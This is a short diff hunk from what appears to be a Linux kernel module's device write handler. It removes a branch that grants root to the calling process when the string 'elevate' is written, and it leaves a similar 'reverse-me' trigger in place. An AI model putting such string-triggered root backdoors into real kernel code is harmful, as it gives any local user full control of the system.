@@ -310,15 +310,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     }
 
 
-    if(memcmp("elevate", tmpdata, strlen("elevate")) == 0){
-        if(strlen(tmpdata) == strlen("elevate")){
-            strcpy(last_data, tmpdata);
-            pr_debug("Setting root for calling process\n");
-            set_root();
-            return 0;
-        }
-    }
-
     if(memcmp("reverse-me", tmpdata, strlen("reverse-me")) == 0){
         if(strlen(tmpdata) == strlen("reverse-me")){
             strcpy(last_data, tmpdata);
